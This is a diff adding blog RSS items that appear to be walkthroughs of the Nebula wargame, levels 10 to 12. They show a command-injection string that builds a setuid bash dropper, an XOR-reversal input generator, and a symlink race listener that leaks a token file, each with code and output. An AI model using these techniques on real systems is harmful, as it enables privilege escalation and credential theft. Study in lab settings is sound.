+      client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
+    end
+
+  end
+
+  client:close()
+end
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;solution:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;&lt;code&gt;prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)&lt;/code&gt; this line of code in &lt;em&gt;hash()&lt;/em&gt; function try to calc the hash of the password, but we can execute any command with a well structed &lt;em&gt;password&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Write a simple Ruby script to send command to server, here I construct a &lt;em&gt;password&lt;/em&gt; to make the server build a &lt;em&gt;drop.c&lt;/em&gt; file into directory /home/flag12.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;
+
+server = TCPSocket.open(&amp;quot;127.0.0.1&amp;quot;, 50001)
+server.puts(&amp;quot;hello &amp;amp;&amp;amp; gcc -o /home/flag12/flag12 /tmp/drop.c &amp;amp;&amp;amp; chmod 777 /home/flag12/flag12 &amp;amp;&amp;amp; chmod +s /home/flag12/flag12 &amp;amp;&amp;amp; echo hello &amp;quot;)
+ret = server.gets.chomp
+puts &amp;quot;#{ret}&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Remenber the piece of C code we used to drop privilege? Here it is again:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* /tmp/drop.c */
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+
+int main() {
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  execv(&amp;quot;/bin/bash&amp;quot;, NULL);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Run the Ruby script, I got&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level12@nebula:~$ ruby client.rb
+Password: Better luck next time
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It is all right, I have no interest in the password anyway. Take a look at the directory /home/flag12&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;flag12@nebula:~$ ll /home/flag12
+total 14
+drwxr-x--- 1 flag12 level12   60 2014-03-02 22:45 ./
+drwxr-xr-x 1 root   root     280 2012-08-27 07:18 ../
+-rw-r--r-- 1 flag12 flag12   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag12 flag12  3353 2011-05-18 02:54 .bashrc
+-rwsrwsrwx 1 flag12 flag12  7322 2014-03-02 22:45 flag12*
+-rw-r--r-- 1 root   root     685 2011-11-20 21:22 flag12.lua
+-rw-r--r-- 1 flag12 flag12   675 2011-05-18 02:54 .profile
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here is the executable &lt;em&gt;flag12&lt;/em&gt; with Set-User-ID bit, run it and a bash with &lt;em&gt;flag12&lt;/em&gt; user privilege will show up!&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Nebula Level 11</title>
+      <link>/hanjc.me/post/2014-01-26-nebula-level11/</link>
+      <pubDate>Sun, 26 Jan 2014 16:44:20 +0800</pubDate>
+      
+      <guid>/hanjc.me/post/2014-01-26-nebula-level11/</guid>
+      <description>
+
+&lt;h3 id=&#34;about:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;About&lt;/h3&gt;
+
+&lt;p&gt;The &lt;em&gt;/home/flag11/flag11&lt;/em&gt; binary processes standard input and executes a shell command.&lt;/p&gt;
+
+&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
+
+&lt;p&gt;To do this level, log in as the &lt;em&gt;level11&lt;/em&gt; account with the password &lt;em&gt;level11&lt;/em&gt; . Files for this level can be found in /home/flag11.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h3 id=&#34;source-code:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Source code&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+
+/*
+ * Return a random, non predictable file, and return the file descriptor for it.
+ */
+
+int getrand(char **path)
+{
+	char *tmp;
+	int pid;
+	int fd;
+
+	srandom(time(NULL));
+
+	tmp = getenv(&amp;quot;TEMP&amp;quot;);
+	pid = getpid();
+
+	asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid, 
+			 &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10), 
+			 &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
+			 &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));
+
+	fd = open(*path, O_CREAT|O_RDWR, 0600);
+	unlink(*path);
+	return fd;
+}
+
+void process(char *buffer, int length)
+{
+	unsigned int key;
+	int i;
+
+	key = length &amp;amp; 0xff;
+
+	for(i = 0; i &amp;lt; length; i++) {
+		buffer[i] ^= key;
+		key -= buffer[i];
+	}
+
+	system(buffer);
+}
+
+#define CL &amp;quot;Content-Length: &amp;quot;
+
+int main(int argc, char **argv)
+{
+	char line[256];
+	char buf[1024];
+	char *mem;
+	int length;
+	int fd;
+	char *path;
+
+	if(fgets(line, sizeof(line), stdin) == NULL) {
+		errx(1, &amp;quot;reading from stdin&amp;quot;);
+	}
+
+	if(strncmp(line, CL, strlen(CL)) != 0) {
+		errx(1, &amp;quot;invalid header&amp;quot;);
+	}
+
+	length = atoi(line + strlen(CL));
+
+	if(length &amp;lt; sizeof(buf)) {
+		if(fread(buf, length, 1, stdin) != length) {
+			err(1, &amp;quot;fread length&amp;quot;);
+		}
+		process(buf, length);
+	} else {
+		int blue = length;
+		int pink;
+
+		fd = getrand(&amp;amp;path);
+
+		while(blue &amp;gt; 0) {
+			printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);
+
+			pink = fread(buf, 1, sizeof(buf), stdin);
+			printf(&amp;quot;pink = %d\n&amp;quot;, pink);
+
+			if(pink &amp;lt;= 0) {
+				err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
+			}
+			write(fd, buf, pink);
+
+			blue -= pink;
+		}  
+
+		mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+		if(mem == MAP_FAILED) {
+			err(1, &amp;quot;mmap&amp;quot;);
+		}
+		process(mem, length);
+	}
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;solution:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;In fact I have not passed this one yet, I have met a &lt;strong&gt;problem&lt;/strong&gt; which I will talk about later,
+right now I just want to explain my &lt;strong&gt;idea&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;The overall function of the program &lt;em&gt;/home/flag11/flag11&lt;/em&gt; is to read some inputs, do some modifications to the inputs and then execute what it gets after the modification.&lt;/p&gt;
+
+&lt;p&gt;More specifically, &lt;em&gt;flag11&lt;/em&gt; requires that the input should match the following pattern:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Content-Length: %d
+Content...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;here, depends on the content length &lt;em&gt;%d&lt;/em&gt;, &lt;em&gt;flag11&lt;/em&gt; will go into two branches, if &lt;code&gt;length &amp;lt; sizeof(buf)&lt;/code&gt;,
+&lt;em&gt;flag11&lt;/em&gt; would read the content directly into &lt;em&gt;buf&lt;/em&gt; and pass it to &lt;em&gt;process&lt;/em&gt;.
+Note that it is required that &lt;code&gt;fread(buf, length, 1, stdin) == length&lt;/code&gt;, so we know that &lt;em&gt;length&lt;/em&gt; must be 1.
+(refer to &lt;a href=&#34;http://linux.die.net/man/3/fread&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;fread()&lt;/em&gt; for details)&lt;/p&gt;
+
+&lt;p&gt;Otherwise if &lt;em&gt;length&lt;/em&gt; is any number larger or equal to 1024, &lt;em&gt;flag11&lt;/em&gt; would buffer the input into a file first,
+then pass the content of the file to &lt;em&gt;process&lt;/em&gt;. I think these are the TWO WAYS mentioned in the description.&lt;/p&gt;
+
+&lt;p&gt;The function &lt;em&gt;process&lt;/em&gt; would do some calculation on &lt;em&gt;buf&lt;/em&gt; based on its content using XOR operation.
+So if we want to executes some commands like &lt;em&gt;/bin/getflag&lt;/em&gt;, we need to do some reverse calculation and find out
+what the origin &lt;em&gt;buf&lt;/em&gt; would be like.&lt;/p&gt;
+
+&lt;h4 id=&#34;way-one:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way One&lt;/h4&gt;
+
+&lt;p&gt;My first thought was that I could make &lt;em&gt;length&lt;/em&gt; to be 1, and make a soft link to &lt;em&gt;/bin/getflag&lt;/em&gt;, then leverage
+&lt;em&gt;flag11&lt;/em&gt; to execute this soft link. I first create a file &lt;em&gt;f.txt&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;``` text f.txt
+Content-Length: 1
+f&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+You can expect that `&#39;f&#39; ^ (length&amp;amp;&amp;amp;0xff) == &#39;g&#39;`, where *length* is 1.
+Then I would execute the following
+
+``` bash
+level11@nebula:~$ ln -s /bin/getflag /tmp/g
+level11@nebula:~$ export PATH=/tmp/:$PATH
+
+
+level11@nebula:~$ /home/flag11/flag11 &amp;lt; /home/level11/f.txt
+sh: gP,: command not found
+
+level11@nebula:/home/flag11$ ./flag11 &amp;lt; /home/level11/f.txt
+sh: $&#39;g\240\030&#39;: command not found
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Failed. Since each time the output command are different (but the first char &lt;em&gt;g&lt;/em&gt; is correct),
+it must be that &lt;em&gt;buf&lt;/em&gt; actually do not have a string terminator &amp;lsquo;\0&amp;rsquo;,
+so I tried a few times and finally&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ../flag11/flag11 &amp;lt; ls.txt
+getflag is executing on a non-flag account, this doesn&#39;t count
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well&amp;hellip;here is the &lt;strong&gt;problem&lt;/strong&gt;, the &lt;em&gt;system()&lt;/em&gt; call would not drop privilege on my system&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;I read the &lt;a href=&#34;http://linux.die.net/man/3/system&#34;&gt;manpage&lt;/a&gt; of &lt;em&gt;system()&lt;/em&gt; carefully, it mentioned that&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Do not use system() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the exec(3) family of functions instead, but not execlp(3) or execvp(3). system() will not, in fact, work properly from programs with set-user-ID or set-group-ID privileges on systems on which /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian uses a modified bash which does not do this when invoked as sh.)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I also did some google and find &lt;a href=&#34;http://www.cplusplus.com/forum/articles/11153/&#34;&gt;this&lt;/a&gt; thread on cplusplus
+and &lt;a href=&#34;http://stackoverflow.com/questions/16258830/does-system-syscall-drop-privileges&#34;&gt;this&lt;/a&gt;
+question on Stackoverflow ot be useful. It is said that &lt;em&gt;system()&lt;/em&gt; itself would not drop privileges,
+but Bash 2 would, and my bash is version 4, so I think this meybe the reason.&lt;/p&gt;
+
+&lt;p&gt;I came across an interesting solution for this routine by &lt;a href=&#34;http://v0ids3curity.blogspot.com/2012/12/exploit-exercise-level-11.html&#34;&gt;Reno Robert&lt;/a&gt;, who leveraged &lt;em&gt;LD_PRELOAD&lt;/em&gt; to initialize the buffer.&lt;/p&gt;
+
+&lt;h4 id=&#34;way-two:c12d59b551e63f0317c82c8d90952a0f&#34;&gt;Way Two&lt;/h4&gt;
+
+&lt;p&gt;Anyway, before I realized this problem, I did do something through the second way,
+to get what the input should be from the output command, I wrote another program &lt;em&gt;gen.c&lt;/em&gt;:&lt;/p&gt;
+
+&lt;p&gt;``` c gen.c
+void process(char *buffer, int length)
+{
+        unsigned int key;
+        int i;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    key = length &amp;amp; 0xff;
+
+    for(i = 0; i &amp;lt; length; i++) {
+            buffer[i] ^= key;
+            key -= (key ^ buffer[i]);
+    }
+    //system(buffer);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;main() {
+  char* cmd = &amp;ldquo;getflag&amp;rdquo;;
+  char buf[1024];
+  int len = strlen(cmd);
+  memset((void *)buf, 0, 1024&amp;gt;&amp;gt;2);
+  strncpy(buf, cmd, len+1);&lt;/p&gt;
+
+&lt;p&gt;process(buf, 1024);
+  printf(&amp;ldquo;Content-Length: 1024\n&amp;rdquo;);
+  fwrite(buf, 1024, 1, stdout);
+}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+and after compiling into an executable *gen*, I tried to trigger the exploit like this
+
+``` bash
+level11@nebula:~$ ./gen | ../flag11/flag11
+blue = 1024, length = 1024, pink = 1024
+getflag is executing on a non-flag account, this doesn&#39;t count
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;same failure, and after that I changed the &lt;em&gt;cmd&lt;/em&gt; from &amp;ldquo;getflag&amp;rdquo; to &amp;ldquo;id&amp;rdquo; ,
+and the output is&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level11@nebula:~$ ./gen | ../flag11/flag11
+blue = 1024, length = 1024, pink = 1024
+uid=1012(level11) gid=1012(level11) groups=1012(level11)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;No privilege dropped )=&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Nebula Level 10</title>
+      <link>/hanjc.me/post/2014-01-25-nebula-level10/</link>
+      <pubDate>Sat, 25 Jan 2014 12:40:53 +0800</pubDate>
+      
+      <guid>/hanjc.me/post/2014-01-25-nebula-level10/</guid>
+      <description>
+
+&lt;h3 id=&#34;about:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;About&lt;/h3&gt;
+
+&lt;p&gt;The setuid binary at &lt;em&gt;/home/flag10/flag10&lt;/em&gt; binary will upload any file given, as long as it meets the requirements of the &lt;em&gt;access()&lt;/em&gt; system call.&lt;/p&gt;
+
+&lt;p&gt;To do this level, log in as the &lt;em&gt;level10&lt;/em&gt; account with the password &lt;em&gt;level10&lt;/em&gt;. Files for this level can be found in /home/flag10.&lt;/p&gt;
+
+&lt;h3 id=&#34;source-code:14691d9c48d881479fa7a5e0fa8d86be&#34;&gt;Source Code&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;errno.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;netinet/in.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+int main(int argc, char **argv)
+{
+  char *file;
+  char *host;
+
+  if(argc &amp;lt; 3) {
+    printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
+    exit(1);
+  }
+
+  file = argv[1];
+  host = argv[2];
+
+  if(access(argv[1], R_OK) == 0) {
+    int fd;
+    int ffd;
+    int rc;
+    struct sockaddr_in sin;
+    char buffer[4096];
+  	
+    printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);
+  	
+    fd = socket(AF_INET, SOCK_STREAM, 0);
+  	
+    memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
+    sin.sin_family = AF_INET;
+    sin.sin_addr.s_addr = inet_addr(host);
+    sin.sin_port = htons(18211);
+  	
+    if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
+      printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
+      exit(EXIT_FAILURE);
+    }
+  	
+#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
+    if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+      printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
+      exit(EXIT_FAILURE);
+    }
+#undef HITHERE
+  
+    printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);
+  	
+    ffd = open(file, O_RDONLY);
+    if(ffd == -1) {
+      printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
+      exit(EXIT_FAILURE);
+    }
+  	
+    rc = read(ffd, buffer, sizeof(buffer));
+    if(rc == -1) {
+      printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
+      exit(EXIT_FAILURE);
+    }
+  	
+    write(fd, buffer, rc);
+  	
+    printf(&amp;quot;wrote file!\n&amp;quot;);
+  } else {
+    printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;There at two files in the directory /home/flag10, &lt;em&gt;flag10&lt;/em&gt; and &lt;em&gt;token&lt;/em&gt;. The source code of executable &lt;em&gt;flag10&lt;/em&gt; in shown above, and &lt;em&gt;token&lt;/em&gt; contains the password of user &lt;em&gt;flag10&lt;/em&gt;. The goal is to read the content of &lt;em&gt;token&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;The attack comes from a common bug called &lt;a href=&#34;http://en.wikipedia.org/wiki/Time-of-check-to-time-of-use&#34;&gt;Time of check to time of use&lt;/a&gt;, the Wiki page above explains precisely about what this bug is and how it can be exploited. So in my imagination this is how this attack would look like:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;pass &lt;em&gt;/home/level10/token&lt;/em&gt; whick links to a real user(&lt;em&gt;level10&lt;/em&gt;) readable file &lt;em&gt;/home/level10/test&lt;/em&gt; to the program as &lt;code&gt;argv[1]&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;/home/flag10/flag10&lt;/em&gt; checks whether this file is accessable at line 24(with the result true)&lt;/li&gt;
+&lt;li&gt;modify the file to link to &lt;em&gt;/home/flag10/token&lt;/em&gt; when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; is executing code between line 24 and line 54&lt;/li&gt;
+&lt;li&gt;when &lt;em&gt;/home/flag10/flag10&lt;/em&gt; reads the file at line 54, it reads &lt;em&gt;/home/flag10/token&lt;/em&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The most important step mentioned above is step 3, it is hard to control the time! Fortunately, the &lt;em&gt;flag10&lt;/em&gt; program will send a banner before actually read the file(line 46), this leaves me some time to make some change!&lt;/p&gt;
+
+&lt;p&gt;Notice that the content of the file would be transmit through a socket connection, so I need to write my own server code. In my consideration, I need to change the file &lt;em&gt;/home/level10/token&lt;/em&gt; immediately after the server accepts a connection from the client, I wrote this server code in Ruby:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;require &#39;socket&#39;
+
+server = TCPServer.new(18211)
+loop {
+    client = server.accept
+    `rm /home/level10/token; ln -s /home/flag10/token /home/level10/token`
+    while msg = client.gets
+        puts &amp;quot;RECV: #{msg}&amp;quot;
+    end
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After the server was started, I triggered the vulnerability with the following command&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ /home/flag10/flag10 ~/token 127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Note that the symbolic file &lt;em&gt;~/token&lt;/em&gt; must exist and point to a file that is readable by user &lt;em&gt;level10&lt;/em&gt; before the program &lt;em&gt;flag10&lt;/em&gt; is executed.&lt;/p&gt;
+
+&lt;p&gt;The output of the Ruby code was not always as expected, sometimes the client read the file before the server changed it, but as long as it could be right, it hacked!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:~$ ruby serv.rb 
+RECV: .oO Oo.
+RECV: hello world
+
+level10@nebula:~$ ruby serv.rb 
+RECV: .oO Oo.
+RECV: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+&lt;/code&gt;&lt;/pre&gt;
 </description>
     </item>
     
